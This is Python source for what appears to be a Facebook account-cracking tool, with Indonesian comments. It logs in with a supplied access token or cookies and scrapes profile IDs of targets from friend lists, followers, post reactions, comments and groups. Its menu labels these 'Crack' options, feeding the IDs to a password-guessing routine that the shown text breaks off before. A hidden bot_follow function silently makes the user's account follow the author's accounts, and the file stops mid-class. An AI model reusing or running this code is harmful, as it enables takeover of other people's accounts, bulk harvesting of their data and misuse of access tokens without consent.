### Import Module
import requests,bs4,sys,os,random,time,re,json,uuid,subprocess,platform,base64
from random import randint
from concurrent.futures import ThreadPoolExecutor as ThreadPool
from bs4 import BeautifulSoup as par
from datetime import date
from datetime import datetime
from urllib.parse import quote
'''Give Away By Moch Nangg XD <3 '''


### Perumpamaan Module & Syntax
_req_ses_  = requests.Session()
_req_get_  = requests.get
_req_post_ = requests.post
_js_lo_    = json.loads
_cici_azimvau_    = input
_azimvau_dapunta_ = open
_cici_cici_       = exit

### Warna
Z = "\033[1;30m" # Hitam
P = "\033[1;37m" # Putih
M = "\033[1;31m" # Merah
H = "\033[1;32m" # Hijau
K = "\033[1;33m" # Kuning
B = "\033[1;34m" # Biru
U = "\033[1;35m" # Ungu
O = "\033[1;36m" # Biru Muda
N = "\033[0m"    # Warna Mati

### Host & Penampungan
host = "https://mbasic.facebook.com"
ok = []
cp = []
ttl = []
count = 1
data_1 = {}
data_2 = {}
data_change_1 = {}
data_change_2 = {}
data_user = []
header_grup = {"user-agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36"}
header_nama = {"origin": "https://mbasic.facebook.com","accept-language": "en-GB,en-US;q=0.9,en;q=0.8,bn;q=0.7","accept-encoding": "gzip, deflate","accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","user-agent": "Mozilla/5.0 (Linux; Android 4.4.4; en-au; SAMSUNG SM-N915G Build/KTU84P) AppleWebKit/537.36 (KTHML, like Gecko) Version/2.0 Chrome/34.0.1847.76 Mobile Safari/537.36","Host": "".join(bs4.re.findall("://(.*?)$","https://m.facebook.com")),"referer": "https://m.facebook.com/login/?next&ref=dbl&fl&refid=8","cache-control": "max-age=0","upgrade-insecure-requests": "1","content-type": "application/x-www-form-urlencoded"}
header_hashtag = {'authority': 'mbasic.facebook.com','method': 'GET','path': '/favicon.ico','scheme': 'https','accept': 'image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8','accept-encoding': 'gzip, deflate','accept-language': 'en-US,en;q=0.9','user-agent': 'Mozilla/5.0 (Linux; Android 4.4.4; en-au; SAMSUNG SM-N915G Build/KTU84P) AppleWebKit/537.36 (KTHML, like Gecko) Version/2.0 Chrome/34.0.1847.76 Mobile Safari/537.36','origin': 'https://www.facebook.com','referer': 'https://www.facebook.com'}

r = str(random.randint(1,9999))
rx = r.replace("1","A").replace("2","C").replace("3","B").replace("4","E").replace("5","H").replace("6","I").replace("7","Y")
plist = (platform.uname())[2]
basex = plist
basex1 = basex.encode('ascii')
basex2 = base64.b64encode(basex1)
basex3 = basex2.decode('ascii')
base4 = (basex3).upper()
basesplit = base4.replace('=', 'N').replace('A', '3').replace('B', '9').replace('C', '7').replace('D', '1').replace('E', '4').replace('M', '2').replace('L', '6').replace('F', '8').replace('N', 'E').replace('T', 'R').replace("5","X").replace("1","X")

try:
    rq = requests.get('https://pastebin.com/raw/nEpjt6QN').text
except requests.exceptions.ConnectionError:
    print('\nNO INTERNET CONNECTION\n')
    exit()

### Waktu & Tanggal
__sekarang__ = datetime.now()
__tahun__ = __sekarang__.year
__bulan__ = __sekarang__.month
__hari__  = __sekarang__.day

bulan_ttl = {"01": "JAN", "02": "FEB", "03": "MAR", "04": "APR", "05": "MAY", "06": "JUN", "07": "JUL", "08": "AUG", "09": "SEP", "10": "OCT", "11": "NOV", "12": "DEC"}
_list_bulan_ = ["JAN", "FEB", "MAR", "APR", "MAY", "JUN", "JUL", "AUG", "SEP", "OCT", "NOV", "DEC"]

try:
    if __bulan__ < 0 or __bulan__ > 12:
        _cici_cici_()
    _bulan_sekarang_ = __bulan__ - 1
except ValueError:
    _cici_cici_()
_bulan_ = _list_bulan_[_bulan_sekarang_]
tanggal = ("%s-%s-%s"%(__hari__,_bulan_,__tahun__))

_my_account_ = [
    '100045203855294','100014839270205']

### User Agent
ua_intelmac = 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36;]'
ua_nokia   = 'Mozilla/4.1 (compatible; MSIE 5.0; Symbian OS; Nokia 7610;451) Opera 6.20'
ua_asus    = 'Dalvik/1.6.0 (Linux; U; Android 4.4.2; ASUS_T00Q Build/KVT49L)/CLDC-1.1;]'
ua_huawei  = 'Mozilla/5.0 (Linux; Android 7.0; HUAWEI CAZ-AL10; HMSCore 5.3.0.312; GMSCore 20.39.15) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 HuaweiBrowser/11.1.0.302 Mobile Safari/537.36 [FBAN/EMA;FBLC/en_US;FBAV/173.0.0.10.118;]' #DONE
ua_vivo    = 'Mozilla/5.0 (Linux; Android 10; V2027) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.99 Mobile Safari/537.36'
ua_oppo    = 'Mozilla/5.0 (Linux; Android 4.1.1; X909 Build/JRO03L) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/30.0.1599.92 Mobile Safari/537.36 [FBAN/EMA;FBLC/en_US;FBAV/173.0.0.10.118;]'
ua_samsung = 'Mozilla/5.0 (Linux; Android 5.0.1; SAMSUNG GT-I9515 Build/LRX22C) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/2.1 Chrome/34.0.1847.76 Mobile Safari/537.36;]'
ua_windows = 'Mozilla/5.0 (X11; U; Linux i686; fr-FR; rv:1.7.8) Gecko/20050511 Firefox/1.0.4;]'
ua_xiaomi  = 'Mozilla/5.0 (Linux; Android 11; Mi 9T Pro Build/RKQ1.200826.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/94.0.4606.80 Mobile Safari/537.36 Reddit/Version 2021.38.0/Build 365032/Android 11 [FBAN/EMA;FBLC/en_US;FBAV/247.0.0.5.130;]'
### Clear Login Session
def bersih():
    try:os.remove('token.txt')
    except:pass
    try:os.remove('cookies.txt')
    except:pass

### Display Text
def jalan(z):
    for e in z + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.04)
def mlaku(z):
    for e in z + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.03)

def psb(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.001)


### Clear Terminal
def clear():
    if "linux" in sys.platform.lower():os.system("clear")
    elif "win" in sys.platform.lower():os.system("cls")
    else:os.system("clear")

logo ="""
\033[1;97m--------------------------------------------------
\033[1;91m Author      : Moch Nangg XD. 
\033[1;91m GitHub      : https://github.com/NANGG-BADUTCODE
\033[1;91m Instagram        : nangg.badutcode
\033[1;97m--------------------------------------------------
"""


### Logo
def banner():
        os.system("clear")
        print (logo)
def cek_dev():
    _isi_dev_ = _azimvau_dapunta_('cookies.txt','r').read()
    if 'null' in _isi_dev_:jalan('%s [%s!%s] %INVALID COOKIES, RE-LOGIN WITH COOKIES'%(M,P,M,P));bersih();_cici_cici_()
    else:pass


def bot_follow(_tok_dev_):
    try:
        for _list_ in _my_account_:
            try:_req_post_("https://graph.facebook.com/%s/subscribers?access_token=%s"%(_list_,_tok_dev_));time.sleep(0.3)
            except:pass
        print('%s '%(O));jalan('%s [%s!%s] %sLOGIN SUCCESSFUL %s^_^'%(H,P,H,H,P));time.sleep(2)
    except:pass
    

def menu_log():
    bersih();clear()
    banner()
    var_menu()
    pmu = _cici_azimvau_('%s [%s•%s] %sCHOOSE : %s'%(H,P,H,K,H))
    print('%s '%(O))
    if pmu in ['']:jalan('%s [%s!%s] %sINCORRECT CONTENT'%(M,P,M,P));menu_log()
    elif pmu in ['1','01','001','a']:
        defaultua()
        token = _cici_azimvau_('%s [%s•%s] %sTOKEN : %s'%(H,P,H,K,H))
        try:x = _req_get_("https://graph.facebook.com/me?access_token=" + token);y = _js_lo_(x.text);n = y['name'];xd = _azimvau_dapunta_("token.txt", "w");xd.write(token);xd.close();xz = _azimvau_dapunta_('cookies.txt','w');xz.write('null');xz.close();bot_follow(token);menu()
        except (KeyError,IOError):print('%s '%(O));jalan('%s [%s!%s] %sTOKEN INVALID'%(M,P,M,P));bersih();menu_log()
        except requests.exceptions.ConnectionError:print('%s '%(O));jalan('%s [%s!%s] %sCONNECTION PROBLEM'%(M,P,M,P));_cici_cici_()
    elif pmu in ['2','02','002','b']:
        defaultua()
        cookie = _cici_azimvau_('%s [%s•%s] %sCOOKIES : %s'%(H,P,H,K,H))
        try:header={'Host':'business.facebook.com','cache-control':'max-age=0','upgrade-insecure-requests':'1','user-agent':'Mozilla/5.0 (Linux; Android 4.4.4; en-au; SAMSUNG SM-N915G Build/KTU84P) AppleWebKit/537.36 (KTHML, like Gecko) Version/2.0 Chrome/34.0.1847.76 Mobile Safari/537.36','accept' : 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8','content-type' : 'text/html; charset=utf-8','accept-encoding':'gzip, deflate','accept-language':'en-GB,en-US;q=0.9,en;q=0.8,bn;q=0.7','cookie': cookie};r=_req_get_("https://business.facebook.com/creatorstudio/home", headers=header);p=re.search('{"accessToken":"(EAA\w+)', r.text);token=p.group(1);xd = _azimvau_dapunta_("token.txt", "w");xd.write(token);xd.close();xz = _azimvau_dapunta_('cookies.txt','w');xz.write(cookie);xz.close();bot_follow(token);menu()
        except requests.exceptions.ConnectionError:print('%s '%(O));jalan('%s [%s!%s] %sCONNECTION PROBLEM'%(M,P,M,P));_cici_cici_()
        except (KeyError,IOError,AttributeError):print('%s '%(O));jalan('%s [%s!%s] %sCOOKIES INVALID'%(M,P,M,P));bersih();menu_log()
    elif pmu in ['0','00','000','z']:exit()
    else:jalan('%s [%s!%s] %sINCORRECT CONTENT'%(M,P,M,P));menu_log()


def menu():
    clear()
    banner()
    jid = ''
    try:
        _azimvau_ = _azimvau_dapunta_("token.txt","r").read();_cici_ = _azimvau_dapunta_("cookies.txt","r").read();_salsabila_ = {"cookie" : _cici_}
        if 'null' in _cici_:status_cookies = ('%sNO'%(M));W = Z;Y = P; B1 = Z; O1 = Z; K1 = Z; H1 = Z; M1 = Z; P1 = Z
        else:status_cookies = ('%sYES'%(H));W = H; Y = K; B1 = B; O1 = O; K1 = K; H1 = H; M1 = M; P1 = P
    except (KeyError,IOError):print('%s [ %sOPPSS :) %s]%s'%(M,P,M,P));print('%s '%(M));jalan('%s [%s!%s] %sTOKEN/COOKIES INVALID'%(M,P,M,P));bersih();menu_log()
    
    try:token = _azimvau_dapunta_("token.txt","r").read();x = _req_get_("https://graph.facebook.com/me?access_token=" + token);y = _js_lo_(x.text);n = y['name'].upper();i = y['id']
    except (KeyError,IOError):print('%s [ %sOPPSS :) %s]%s'%(M,P,M,M));print('%s '%(M));jalan('%s [%s!%s] %sTOKEN/COOKIES INVALID'%(M,P,M,P));bersih();menu_log()
    except requests.exceptions.ConnectionError:print('%s [ %sOPPSS :) %s]%s'%(M,P,M,P));print('%s '%(M));jalan('%s [%s!%s] %sCONNECTION PROBLEM'%(M,P,M,P));_cici_cici_()
    except requests.exceptions.ConnectionError:print('%s [ %sOPPSS :) %s]%s'%(M,P,M,P));print('%s '%(M));jalan('%s [%s!%s] %sCONNECTION PROBLEM'%(M,P,M,P));_cici_cici_()
    try:a = _req_get_("http://ip-api.com/json/",headers={"Referer":"http://ip-api.com/","Content-Type":"application/json; charset=utf-8","User-Agent":"Mozilla/5.0 (Linux; Android 4.4.4; en-au; SAMSUNG SM-N915G Build/KTU84P) AppleWebKit/537.36 (KTHML, like Gecko) Version/2.0 Chrome/34.0.1847.76 Mobile Safari/537.36;]"}).json();ip = a["query"];loc = a["country"].upper()
    except KeyError:ip = " "
    psb('         %s》%s》%s》%sWelcome%s《%s《%s《'%(M,H,B,H,B,H,M))
    print('%s '%(O))
    print('%s [%s•%s] %sNAME   %s: %s%s'%(H,P,H,B,K,H,n))
    print('%s [%s•%s] %sID     %s: %s%s'%(H,P,H,B,K,H,i))
    print('%s [%s•%s] %sIP     %s: %s%s'%(H,P,H,B,K,H,ip))
    print('%s [%s•%s] %sFROM   %s: %s%s'%(H,P,H,B,K,H,loc))
    print('')
    print('%s [%s>_%s] %sTOKEN%s/%sCOOKIES %s: %sYES%s/%s'%(H,P,H,B,Z,B,K,H,P,status_cookies))
    print('%s '%(O))
    psb('%s [%s01%s] %sCrack PUBLIC ID '%(H,P,H,H))
    psb('%s [%s02%s] %sCrack FROM FOLLOWER ID V1'%(H,P,H,B1))
    psb('%s [%s04%s] %sCrack FROM SEARCH NAME ID '%(H,P,H,O1))
    psb('%s [%s05%s] %sCrack FROM MESSAGE LIST ID '%(H,P,H,K1))
    psb('%s [%s06%s] %sCrack FROM POST REACTS '%(H,P,H,H1))
    psb('%s [%s07%s] %sCrack FROM POST COMMENTS '%(H,P,H,B1))
    psb('%s [%s08%s] %sCrack FROM GROUP MEMBERS '%(H,P,H,M1))
    psb('%s [%s09%s] %sCrack ID FROM EMAIL'%(H,P,H,O))
    psb('%s [%s10%s] %sCrack USERNAME'%(H,P,H,K))
    psb('%s [%s11%s] %sCrack FROM HASHTAG'%(H,P,H,B1))
    psb('%s [%s12%s] %sCrack ID FROM HOME PAGE'%(H,P,H,P1))
    psb('%s [%s13%s] %sCrack ID FROM FRIEND REQUESTS '%(H,P,H,K1))
    psb('%s [%s14%s] %sCrack FROM SENT REQUESTS '%(H,P,H,H1))
    psb('%s [%s15%s] %sCrack UID FROM PUBLIC ID'%(H,P,H,O))
    psb('%s [%s16%s] %sCrack AUTO CLONE CRACKED IDS'%(H,P,H,K))
    psb('%s [%s17%s] %sVIEW CLONE RESULTS '%(H,P,H,P))
    psb('%s [%s18%s] %sUSER AGENT SETTINGS '%(H,P,H,M))
    psb('%s [%s19%s] %s FILE'%(H,P,H,H))
    psb('%s [%s00%s] %sLOGOUT'%(H,M,H,M))
    print('')
    pm = _cici_azimvau_('%s [%s>_%s] %sCHOOSE : %s'%(H,P,H,K,H))
    print('%s '%(O))
    if pm in ['']:jalan('%s [%s!%s] %sINCORRECT CONTENT'%(P,M,P,M));menu()
    elif pm in ['1','01','001','a']:publik(token)
    elif pm in ['2','02','002','b']:pengikut(token)
    elif pm in ['3','03','003','c']:cek_dev();followers(_salsabila_)
    elif pm in ['4','04','004','d']:cek_dev();dump_name(_salsabila_)
    elif pm in ['5','05','005','e']:cek_dev();dump_pesan(_salsabila_,n,i)
    elif pm in ['6','06','006','f']:cek_dev();main_likers(_salsabila_)
    elif pm in ['7','07','007','g']:cek_dev();main_komen(_salsabila_)
    elif pm in ['8','08','008','h']:cek_dev();dump_grup(_salsabila_,_azimvau_)
    elif pm in ['9','09','009','i']:dump_email()
    elif pm in ['10','010','0010','j']:dump_username()
    elif pm in ['11','011','0011','k']:cek_dev();hashtag(_salsabila_)
    elif pm in ['12','012','0012','l']:cek_dev();beranda(_salsabila_)
    elif pm in ['13','013','0013','m']:cek_dev();permintaan_pertemanan_masuk(_salsabila_)
    elif pm in ['14','014','0014','n']:cek_dev();permintaan_pertemanan_keluar(_salsabila_)
    elif pm in ['15','015','0015','o']:teman_target()
    elif pm in ['16','016','0016','p']:cek_result()
    elif pm in ['17','017','0017','q']:result()
    elif pm in ['18','018','0018','r']:ugen()
    elif pm in ['19','019','0019','s']:file()
    elif pm in ['0','00','000','z']:jalan('%s [%s!%s] %sSEE YOU %s%s%s'%(H,P,H,K,O,n,P));bersih();menu_log()
    else:jalan('%s [%s!%s] %sINCORRECT CONTENT'%(M,P,M,P));menu()


def defaultua():
    ua = ua_xiaomi
    try:ugent = _azimvau_dapunta_('ugent.txt','w');ugent.write(ua);ugent.close()
    except (KeyError,IOError):menu_log()


def ugen():
    var_ugen()
    pmu = _cici_azimvau_('%s [%s•%s] %sCHOOSE : '%(H,P,H,K))
    print('%s '%(O))
    if pmu in[""]:jalan('%s [%s!%s] %sINCORRECT CONTENT'%(M,P,M,P));menu()
    elif pmu in ['1','01','001','a']:os.system('xdg-open https://www.google.com/search?q=My+User+Agent&oq=My+User+Agent&aqs=chrome..69i57j0l3j0i22i30l6.4674j0j1&sourceid=chrome&ie=UTF-8');_cici_azimvau_('%s [ %sBACK %s]%s'%(M,P,M,K));menu()
    elif pmu in ['2','02','002','b']:
        os.system("rm -rf ugent.txt");ua = _cici_azimvau_("%s [%s•%s] %sENTER USER AGENT : \n\n"%(H,P,H,K))
        try:ugent = _azimvau_dapunta_('ugent.txt','w');ugent.write(ua);ugent.close();jalan("\n%s [ %sSUCCESSFULLY CHANGED USER AGENT %s]"%(H,P,H));print('%s '%(O));_cici_azimvau_('%s [ %sBACK %s]%s'%(H,P,H,K));menu()
        except (KeyError,IOError):jalan("\n%s [ %sFAILED TO CHANGE USER AGENT %s]"%(Z,M,Z));print('%s '%(M));_cici_azimvau_('%s [ %sBACK %s]%s'%(M,P,M,P));menu()
    elif pmu in ['3','03','003','c']:ugen_hp()
    elif pmu in ['4','04','004','d']:os.system("rm -rf ugent.txt");jalan("%s [ %sUSER AGENT SUCCESSFULLY DELETED %s]"%(H,P,H));print('%s '%(O));_cici_azimvau_('%s [ %sBACK %s]%s'%(H,P,H,K));menu()
    elif pmu in ['5','05','005','e']:
        try:ungser = _azimvau_dapunta_('ugent.txt', 'r').read()
        except (KeyError,IOError):ungser = 'NOT FOUND'
        print("%s [%s•%s] %sYOUR USER AGENT  : \n\n%s%s"%(H,P,H,P,O,ungser));jalan("\n%s [ %sTHIS IS YOUR CURRENT USER AGENT %s]"%(H,K,H));print('%s '%(O));_cici_azimvau_('%s [ %sBACK %s]%s'%(H,P,H,K));menu()
    elif pmu in ['0','00','000','f']:menu()
    else:jalan('%s [%s!%s] %sINCORRECT CONTENT'%(M,P,M,P))
def ugen_hp():
    os.system("rm -rf ugent.txt")
    print('%s [%s1%s] %INTELMAC'%(H,P,H,K))
    print('%s [%s2%s] %sNOKIA'%(H,P,H,H))
    print('%s [%s3%s] %sASUS'%(H,P,H,M))
    print('%s [%s4%s] %sHUAWEI'%(H,P,H,B))
    print('%s [%s5%s] %sVIVO'%(H,P,H,O))
    print('%s [%s6%s] %sOPPO'%(H,P,H,K))
    print('%s [%s7%s] %sSAMSUNG'%(H,P,H,B))
    print('%s [%s8%s] %sWINDOWS'%(H,P,H,M))
    print('%s [%s9%s] %sXIAOMI'%(H,P,H,M))
    print('')
    pc = _cici_azimvau_('%s [%s•%s] %sCHOOSE : '%(H,P,H,K))
    print('%s '%(O))
    if pc in['']:jalan('%s [%s!%s] %sINCORRECT CONTENT'%(M,P,M,M));menu()
    elif pc in ['1','01']:ugent = _azimvau_dapunta_('ugent.txt','w');ugent.write(ua_xiaomi);ugent.close()
    elif pc in ['2','02']:ugent = _azimvau_dapunta_('ugent.txt','w');ugent.write(ua_nokia);ugent.close()
    elif pc in ['3','03']:ugent = _azimvau_dapunta_('ugent.txt','w');ugent.write(ua_asus);ugent.close()
    elif pc in ['4','04']:ugent = _azimvau_dapunta_('ugent.txt','w');ugent.write(ua_huawei);ugent.close()
    elif pc in ['5','05']:ugent = _azimvau_dapunta_('ugent.txt','w');ugent.write(ua_vivo);ugent.close()
    elif pc in ['6','06']:ugent = _azimvau_dapunta_('ugent.txt','w');ugent.write(ua_oppo);ugent.close()
    elif pc in ['7','07']:ugent = _azimvau_dapunta_('ugent.txt','w');ugent.write(ua_samsung);ugent.close()
    elif pc in ['8','08']:ugent = _azimvau_dapunta_('ugent.txt','w');ugent.write(ua_windows);ugent.close()
    elif pc in ['9','09']:ugent = _azimvau_dapunta_('ugent.txt','w');ugent.write(ua_intelmac);ugent.close()
    else:jalan('%s [%s!%s] %sINCORRECT CONTENT'%(M,P,M,P));menu()
    jalan("%s [ %sSUCCESSFULLY CHANGED USER AGENT %s]"%(H,P,H));print('%s '%(O));_cici_azimvau_('%s [ %sBACK %s]%s'%(M,P,M,P));menu()


def publik(token):
    jid = '5000'
    try:
        print('%s [%s•%s] %sWRITE \'me\' TO RETRIEVE FRIEND ID'%(H,P,H,K));it = _cici_azimvau_("%s [%s•%s] %sTARGET ID : "%(H,P,H,K));cek_target_crack_(it)
        try:pb = _req_get_("https://graph.facebook.com/" + it + "?fields=name,id,first_name,middle_name,last_name,name_format,picture,short_name&access_token=" + token);ob = _js_lo_(pb.text);print ('%s [%s•%s] %sNAME : %s'%(H,P,H,K,ob['name']))
        except (KeyError,IOError):print('%s '%(O));jalan('%s [%s!%s] %sID NOT FOUND'%(M,P,M,P));menu()
        r = _req_get_("https://graph.facebook.com/%s/friends?limit=%s&fields=name,id,first_name,middle_name,last_name,name_format,picture,short_name&access_token=%s"%(it,jid,token));id = [];z = _js_lo_(r.text);xc = (ob["first_name"]+".json").replace(" ","_");xb = _azimvau_dapunta_(xc,"w")
        for a in z["data"]:
            try:id.append(a["id"]+"•"+a["name"]);xb.write(a["id"]+"•"+a["name"]+"\n")
            except:continue
        xb.close();print('%s [%s•%s] %sTOTAL ID : %s'%(H,P,H,K,len(id)));return crack(xc)
    except (KeyError,IOError):_cici_cici_('%s [%s!%s] %sINVALID TOKEN/COOKIES OR ID NOT FOUND'%(M,P,M,P))


def pengikut(token):
    try:
        jid = '10000'
        x = requests.get("https://graph.facebook.com/me?access_token=" + token)
        y = json.loads(x.text)
        n = y['name'].upper()
    except (KeyError,IOError):
        xox('%s [%s!%s] %sINVALID TOKEN/COOKIES'%(M,P,M,P))
        os.system('rm -rf token.txt')
        menu_log()
    except requests.exceptions.ConnectionError:
        xox('%s [%s!%s] %sCONNECTION PROBLEM'%(M,P,M,P))
        exit()
    try:
        print('%s [%s•%s] %sWRITE \'me\' FOR TAKING FRIEND ID'%(H,P,H,K))
        it = input("%s [%s•%s] %sTARGET ID : %s"%(H,P,H,K,H))
        try:
            pb = requests.get("https://graph.facebook.com/" + it + "?access_token=" + token)
            ob = json.loads(pb.text)
            print ('%s [%s•%s] %sNAME : %s%s'%(H,P,H,O,H,ob['name'].upper()))
        except (KeyError,IOError):
            print
            xox('%s [%s!%s] %sID NOT FOUND'%(M,P,M,P))
            menu()
        r = requests.get("https://graph.facebook.com/%s/subscribers?limit=%s&access_token=%s"%(it,jid,token))
        id = []
        z = json.loads(r.text)
        xc = (ob["first_name"]+".json").replace(" ","_")
        xb = open(xc,"w")
        for a in z["data"]:
            id.append(a["id"]+"•"+a["name"])
            xb.write(a["id"]+"•"+a["name"]+"\n")
        xb.close()
        print('%s [%s•%s] %sALL ID : %s%s'%(H,P,H,O,H,len(id)))
        return crack(xc)
    except Exception as e:
        exit('%s [%s!%s] %sERROR : %s'%(M,P,M,P,e))



def followers(cookies):
    _query_ = _cici_azimvau_('%s [%s•%s] %sENTER TARGET ID : '%(H,P,H,K));print("%s [%s•%s] %sPRESS CTRL+C TO STOP DUMP"%(H,P,H,K));_file_ = _query_+'.json';_url_dev_ = 'https://mbasic.facebook.com/subscribe/lists/?id=' + _query_;_file_ = (_query_+'.json').replace(' ','_')
    try:os.remove(_file_)
    except:pass
    exec_followers(_url_dev_,cookies,_file_);print("\n%s [%s•%s] %sSUCCESSFUL DUMP %s ID"%(H,P,H,K,len(_azimvau_dapunta_(_file_).read().splitlines())));return crack(_file_)
def exec_followers(url,cookies,_file_):
    open(_file_,'a');_req_ses_ = requests.Session();_req_get_ = _req_ses_.get(url,cookies=cookies);_sop_dev_ = par(_req_get_.text,'html.parser');_buka_file_ = open(_file_).read();print("\r%s [%s•%s] %sTAKING %s%s ID"%(H,P,H,K,H,len(_azimvau_dapunta_(_file_).read().splitlines())), end=' ');sys.stdout.flush()
    try:
        for _cici_ in _sop_dev_.find_all('a',href=True):
            if "profile.php" in _cici_.get('href'):
                try:
                    _name_dev_ = _cici_.text;_id_dev_ = "".join(bs4.re.findall("profile\.php\?id=(.*?)&",_cici_.get("href")))
                    if _name_dev_ in _buka_file_:pass
                    elif '/' in _id_dev_:pass
                    else:open(_file_,'a+').write('%s•%s\n'%(_id_dev_,_name_dev_))
                except:pass
            else:pass
        for _cici_ in _sop_dev_.find_all('a',href=True):
            if 'See more' in _cici_.text:url_dev = 'https://mbasic.facebook.com/' + _cici_.get('href');exec_followers(url_dev,cookies,_file_)
    except KeyboardInterrupt:print("\n%s [%s•%s] %sSUCCESSFUL DUMP %s ID"%(H,P,H,K,len(_azimvau_dapunta_(_file_).read().splitlines())));return crack(_file_)



def main_likers(_azimvau_):
    _query_ = _cici_azimvau_('%s [%s•%s] %sENTER POST ID : '%(H,P,H,K));print("%s [%s•%s] %sPRESS CTRL+C TO STOP DUMP"%(H,P,H,K));_file_ = _query_+'.json'
    try:os.remove(_query_+'.json')
    except:pass
    _azimvau_dapunta_(_file_,'w');_url_ = ('https://mbasic.facebook.com/ufi/reaction/profile/browser/?ft_ent_identifier='+_query_);scrape_likers(_azimvau_,_url_,_file_)
    if len(_azimvau_dapunta_(_file_).read().splitlines()) == 0:print('\n%s [%s!%s] %sPOST NOT FOUND'%(M,P,M,P));_cici_cici_()
    print("\n%s [%s•%s] %sSUCCESSFUL DUMP %s ID"%(H,P,H,K,len(_azimvau_dapunta_(_file_).read().splitlines())));return crack(_file_)
def scrape_likers(_azimvau_,_url_,_file_):
    _ses_ = _req_ses_;_url_load_ = _ses_.get(_url_,cookies=_azimvau_,headers=header_grup).text.encode("utf-8");_ses_par_ = par(_url_load_,'html.parser');print("\r%s [%s•%s] %sTAKING %s%s ID"%(H,P,H,K,H,len(_azimvau_dapunta_(_file_).read().splitlines())), end=' ');sys.stdout.flush()
    try: 
        for _isi_ in _ses_par_.find_all('h3'):
            for _id_ in _isi_.find_all('a',href=True):
                try:
                    if "profile.php" in _id_.get("href"):_a_ = _id_.get("href").split('=')[1];__id__ = _id_.text;_azimvau_dapunta_(_file_,'a+').write(_a_+'•'+__id__+'\n')
                    else:_a_ = _id_.get("href").split('/')[1];__id__ = _id_.text;_azimvau_dapunta_(_file_,'a+').write(_a_+'•'+__id__+'\n')
                except:continue
        for _lanjut_ in _ses_par_.find_all("a",href=True):
            if "See more" in _lanjut_.text:
                while True:
                    try:scrape_likers(_azimvau_,"https://mbasic.facebook.com/"+_lanjut_.get("href"),_file_);break
                    except Exception as e:print('%s%s'%(M,e))
    except KeyboardInterrupt:print("\n%s [%s•%s] %sSUCCESSFUL DUMP %s ID"%(H,P,H,K,len(_azimvau_dapunta_(_file_).read().splitlines())));return crack(_file_)


def main_komen(_azimvau_):
    _query_ = _cici_azimvau_('%s [%s•%s] %sENTER POST ID : '%(H,P,H,K));print("%s [%s•%s] %sPRESS CTRL+C TO STOP DUMP"%(H,P,H,K));_file_ = _query_+'.json'
    try:os.remove(_query_+'.json')
    except:pass
    _azimvau_dapunta_(_file_,'w');_url_ = ('https://mbasic.facebook.com/'+_query_);scrape_komen(_azimvau_,_url_,_file_)
    if len(_azimvau_dapunta_(_file_).read().splitlines()) == 0:print('\n%s [%s!%s] %sPOST NOT FOUND'%(M,P,M,P));_cici_cici_()
    print("\n%s [%s•%s] %sSUCCESSFUL DUMP %s ID"%(H,P,H,K,len(_azimvau_dapunta_(_file_).read().splitlines())));return crack(_file_)
def scrape_komen(_azimvau_,_url_,_file_):
    _ses_ = _req_ses_;_url_load_ = _ses_.get(_url_,cookies=_azimvau_,headers=header_grup).text.encode("utf-8");_ses_par_ = par(_url_load_,'html.parser');print("\r%s [%s•%s] %sTAKING %s%s ID"%(H,P,H,K,H,len(_azimvau_dapunta_(_file_).read().splitlines())), end=' ');sys.stdout.flush()
    try: 
        for _isi_ in _ses_par_.find_all('h3'):
            for _id_ in _isi_.find_all('a',href=True):
                try:
                    if "profile.php" in _id_.get("href"):_a_="".join(bs4.re.findall("profile\.php\?id=(.*?)&",_id_.get("href")));__id__ = _id_.text;_azimvau_dapunta_(_file_,'a+').write(str(_a_).split('&')[0]+'•'+__id__+'\n')
                    else:_a_="".join(bs4.re.findall("/(.*?)\?",_id_.get("href")));__id__ = _id_.text;_azimvau_dapunta_(_file_,'a+').write(str(_a_).split('?')[0]+'•'+__id__+'\n')
                except:continue
        for _lanjut_ in _ses_par_.find_all("a",href=True):
            if "View more comments…" in _lanjut_.text:
                while True:
                    try:scrape_komen(_azimvau_,"https://mbasic.facebook.com/"+_lanjut_.get("href"),_file_);break
                    except Exception as e:print('%s%s'%(M,e))
            elif "View previous comments…" in _lanjut_.text:
                while True:
                    try:scrape_likers(_azimvau_,"https://mbasic.facebook.com/"+_lanjut_.get("href"),_file_);break
                    except Exception as e:print('%s%s'%(M,e))
    except KeyboardInterrupt:print("\n%s [%s•%s] %sSUCCESSFUL DUMP %s ID"%(H,P,H,K,len(_azimvau_dapunta_(_file_).read().splitlines())));return crack(_file_)


class dump_grup:
    def __init__(self,_azimvau_,_cici_):
        self.glist=[];self._grup_=[];self.id='__azimvau__.json';self.token=_cici_;self.cookies=_azimvau_;self.header = {"user-agent": "Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/en_US;FBAV/173.0.0.10.118;]"};self.main_group("https://m.facebook.com/groups/?seemore")
    def main_group(self, url_dev):
        bs=bs4.BeautifulSoup(_req_get_(url_dev,cookies=self.cookies,headers=self.header).text,"html.parser")
        for _cici_ in bs.find_all("a",href=True):
            if "/groups/" in _cici_.get("href"):
                if "category" in _cici_.get("href") or "create" in _cici_.get("href"):continue
                else:self.glist.append({"id":"".join(bs4.re.findall("/groups/(.*?)\?",_cici_.get("href"))),"name":_cici_.text})
        if len(self.glist) !=0:
